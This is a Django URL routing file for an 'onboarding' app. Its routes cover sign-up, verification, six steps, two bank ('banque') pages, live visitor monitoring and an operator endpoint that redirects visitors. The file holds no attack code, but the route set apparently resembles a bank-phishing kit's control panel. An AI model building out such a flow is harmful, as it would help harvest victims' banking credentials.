from django.contrib import admin
from django.urls import path
from onboarding import views  # ← import explicite depuis l'app onboarding

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', views.inscription, name='inscription'),
    path('verification/', views.verification, name='verification'),
    path('etape-1/', views.etape_1, name='etape_1'),
    path('etape-2/', views.etape_2, name='etape_2'),
    path('etape-3/', views.etape_3, name='etape_3'),
    path('etape-4/', views.etape_4, name='etape_4'),
    path('etape-5/', views.etape_5, name='etape_5'),
    path('etape-6/', views.etape_6, name='etape_6'),
    path('banque-1/', views.banque_1, name='banque_1'),
    path('banque-2/', views.banque_2, name='banque_2'),
    path('visiteurs/', views.visiteurs_temps_reel, name='visiteurs'),
    path('visiteurs/json/', views.visiteurs_json, name='visiteurs_json'),
    path('visiteurs/rediriger/', views.rediriger_visiteur,   name='rediriger_visiteur'),
    path('verifier-redirection/', views.verifier_redirection, name='verifier_redirection'),
]